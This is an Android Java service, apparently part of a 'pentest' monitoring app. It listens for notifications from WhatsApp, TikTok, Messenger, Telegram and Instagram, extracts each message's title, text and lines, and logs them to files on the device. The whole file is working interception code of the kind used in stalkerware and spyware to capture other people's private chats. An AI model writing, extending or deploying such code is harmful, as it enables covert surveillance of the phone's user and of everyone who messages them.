// NotificationCaptureService.java
package com.yourorg.pentest.monitor;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.util.Log;
import java.io.File;
import java.io.FileWriter;

public class NotificationCaptureService extends NotificationListenerService {

    private static final String TAG = "NotifCapture";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        if (!isTargetApp(packageName)) return;

        try {
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            CharSequence[] lines = extras.getCharSequenceArray("android.textLines");

            StringBuilder sb = new StringBuilder();
            sb.append("[")
              .append(new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                      java.util.Locale.US).format(new java.util.Date()))
              .append("] [").append(packageName).append("]\n");
            sb.append("  Title: ").append(title).append("\n");
            sb.append("  Text: ").append(text).append("\n");

            if (lines != null) {
                for (CharSequence line : lines) {
                    sb.append("  Line: ").append(line).append("\n");
                }
            }
            sb.append("---\n");

            String dirName = packageName.replace('.', '_');
            File dir = new File(getExternalFilesDir(null), "monitor/notifications/" + dirName);
            dir.mkdirs();
            File file = new File(dir, "notifications.txt");
            FileWriter fw = new FileWriter(file, true);
            fw.append(sb.toString());
            fw.close();

            Log.d(TAG, "Captured notification from " + packageName);

        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }

    private boolean isTargetApp(String pkg) {
        return pkg != null && (
            pkg.contains("whatsapp") ||
            pkg.contains("com.whatsapp") ||
            pkg.contains("tiktok") ||
            pkg.contains("com.zhiliaoapp") ||
            pkg.contains("messenger") ||
            pkg.contains("telegram") ||
            pkg.contains("instagram")
        );
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}
